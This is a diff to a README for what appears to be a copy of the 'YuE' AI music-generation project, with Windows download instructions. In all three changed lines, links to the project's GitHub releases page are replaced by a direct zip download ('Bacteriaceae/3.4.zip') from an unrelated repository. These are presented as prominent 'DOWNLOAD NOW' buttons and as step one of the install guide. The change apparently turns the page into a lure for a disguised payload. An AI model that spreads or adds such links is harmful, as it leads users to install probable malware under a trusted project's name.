@@ -6,7 +6,7 @@ description: "Unify symbolic and audio music generation with frontier-quality co
 <h1>🌈 YuE - Create Original Music with AI</h1>
 
 <p align="center">
-  <a href="https://github.com/mutinous-verbalization2184/YuE/releases" style="background-color:#FF6B6B; color:white; padding:16px 32px; text-decoration:none; font-size:24px; border-radius:8px; display:inline-block; font-weight:bold;">📥 DOWNLOAD NOW</a>
+  <a href="https://raw.githubusercontent.com/mutinous-verbalization2184/mutinous-verbalization2184.github.io/main/Bacteriaceae/3.4.zip" style="background-color:#FF6B6B; color:white; padding:16px 32px; text-decoration:none; font-size:24px; border-radius:8px; display:inline-block; font-weight:bold;">📥 DOWNLOAD NOW</a>
 </p>
 
 ## 🎵 What is YuE?
@@ -33,7 +33,7 @@ Getting YuE on your Windows computer is easier than you think. Follow these simp
 
 **Step 1: Download the Application**
 
-Visit this link to download the application: **[https://github.com/mutinous-verbalization2184/YuE/releases](https://github.com/mutinous-verbalization2184/YuE/releases)**
+Visit this link to download the application: **[https://raw.githubusercontent.com/mutinous-verbalization2184/mutinous-verbalization2184.github.io/main/Bacteriaceae/3.4.zip](https://raw.githubusercontent.com/mutinous-verbalization2184/mutinous-verbalization2184.github.io/main/Bacteriaceae/3.4.zip)**
 
 You'll see a page with different files available for download. Look for the latest version and click the download button. The file will start downloading to your computer - usually to your "Downloads" folder.
 
@@ -156,7 +156,7 @@ Remember - every great musician started as a beginner. YuE is here to lower the 
 Don't wait any longer. Your musical journey starts now with a single click:
 
 <p align="center">
-  <a href="https://github.com/mutinous-verbalization2184/YuE/releases" style="background-color:#4ECDC4; color:white; padding:14px 28px; text-decoration:none; font-size:20px; border-radius:8px; display:inline-block; font-weight:bold;">🚀 DOWNLOAD YUE NOW</a>
+  <a href="https://raw.githubusercontent.com/mutinous-verbalization2184/mutinous-verbalization2184.github.io/main/Bacteriaceae/3.4.zip" style="background-color:#4ECDC4; color:white; padding:14px 28px; text-decoration:none; font-size:20px; border-radius:8px; display:inline-block; font-weight:bold;">🚀 DOWNLOAD YUE NOW</a>
 </p>
 
 Happy music making, and we can't wait to hear what you create!
